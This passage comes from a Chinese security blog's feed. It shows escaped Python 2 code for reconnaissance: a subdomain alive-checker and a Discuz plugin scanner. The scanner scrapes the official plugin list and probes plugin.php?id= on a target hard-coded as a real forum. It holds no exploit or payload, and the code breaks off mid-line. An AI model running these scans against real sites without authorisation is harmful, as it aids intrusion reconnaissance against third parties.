 <code>&lt;span class=&quot;pln&quot;&gt;    list &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[]&lt;/span&gt;</code><br>31.  <code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; open&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;zto.cn&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;():&lt;/span&gt;</code><br>32.  <code>&lt;span class=&quot;pln&quot;&gt;        i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;\t&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;</code><br>33.  <code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#print i&lt;/span&gt;</code><br>34.  <code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&amp;#42&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>35.  <code>&lt;span class=&quot;pln&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;pass&lt;/span&gt;</code><br>36.  <code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>37.  <code>&lt;span class=&quot;pln&quot;&gt;            alivecheck&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>38.  <code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; l &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; list&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>39.  <code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;[-] &#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;url&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;])+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;\t&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;status&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;])+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;\t&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;title&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;</code></pre></div><div><br></div><div><a href="http://www.wiz.cn/i/93198460" title="来自为知笔记(Wiz)" target="_blank" rel="noopener">来自为知笔记(Wiz)</a></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;div&gt;&lt;font face=&quot;微软雅黑&quot;&gt;&amp;nbsp; &amp;nbsp; 安全测试的时候用到的一些小脚本&lt;/font&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font face=&quot;微软雅黑&quot;&gt;1.查二级域名&lt;/font&gt;&lt;/div&gt;&lt;font face=&quot;微软雅黑&quot;&gt;&amp;nbsp; &amp;nb
      
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>【python】扫discuz插件小工具</title>
    <link href="https://tycx2ry.github.io/2015/09/23/e3-80-90python-e3-80-91-e6-89-abdiscuz-e6-8f-92-e4-bb-b6-e5-b0-8f-e5-b7-a5-e5-85-b7/"/>
    <id>https://tycx2ry.github.io/2015/09/23/e3-80-90python-e3-80-91-e6-89-abdiscuz-e6-8f-92-e4-bb-b6-e5-b0-8f-e5-b7-a5-e5-85-b7/</id>
    <published>2015-09-23T08:51:59.000Z</published>
    <updated>2018-02-26T06:02:20.784Z</updated>
    
    <content type="html"><![CDATA[<p><font face="微软雅黑">&nbsp; &nbsp;为了做渗透测试的时候，方便快速寻找discuz插件，于是用python简单写了个小工具</font>，代码写的不是很讲究，将就用<div><br></div><div>1.在discuz官方爬取插件字典</div><div><div><pre class="prettyprint linenums prettyprinted"></pre></div></div></p><ol><li><code>&lt;span class=&quot;com&quot;&gt;# -&amp;#42- coding:utf-8 -&amp;#42-&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;</code><br>4.5.6.  <code>&lt;span class=&quot;kwd&quot;&gt;def&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; getsigledate&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;    url &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;http://addon.discuz.com/index.php?view=plugins&amp;amp;f_order=create&amp;amp;page=&#39;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;    user_agent &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#39;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;    headers &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;User-Agent&#39;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; user_agent &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        request &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;headers &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; headers&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        response &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        content &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; response&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        pattern &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;compile&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&amp;lt;a href=&quot;http:\/\/addon.discuz.com/\?@([0-9a-zA-Z_]&amp;#42)\.plugin&quot; class=&quot;avt&quot;&amp;gt;&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        items &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; item &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; items&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; item&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;URLError&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; hasattr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;code&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;code&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; hasattr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;reason&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;reason&lt;/span&gt;</code><br>23.24.  <code>&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; __name__ &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; range&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;140&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        getsigledate&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;</code><div>字典：<a href="https://github.com/Tycx2ry/discuz-plugin-scan/blob/master/dzpluginlist.txt" target="_blank" rel="noopener">https://github.com/Tycx2ry/discuz-plugin-scan/blob/master/dzpluginlist.txt</a> </div><div><br></div><div>2.插件扫描检测</div><div><br></div><div><div><pre class="prettyprint linenums prettyprinted"></pre></div></div></p></li><li><p><code>&lt;span class=&quot;com&quot;&gt;# -&amp;#42- coding:utf-8 -&amp;#42-&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;</code><br>3.4.  <code>&lt;span class=&quot;kwd&quot;&gt;def&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; checkplugin&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;    url &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; host&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;/plugin.php?id=&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;    user_agent &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#39;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;    headers &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;User-Agent&#39;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; user_agent &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        request &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;headers &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; headers&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        response &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;urlopen&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        content &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; response&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;utf8&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; content&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;\u63d2\u4ef6\u4e0d\u5b58\u5728\u6216\u5df2\u5173\u95ed&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#pass&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;__notfind&#39;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;____find&#39;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;            list&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; urllib2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;URLError&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        open&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;error.txt&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;\n&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; hasattr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;code&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;code&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; hasattr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;reason&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;):&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; e&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;reason&lt;/span&gt;</code><br>24.25.26.27.  <code>&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; __name__ &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;    host &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;http://bbs.tuniu.com&#39;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;#&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;    list &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span 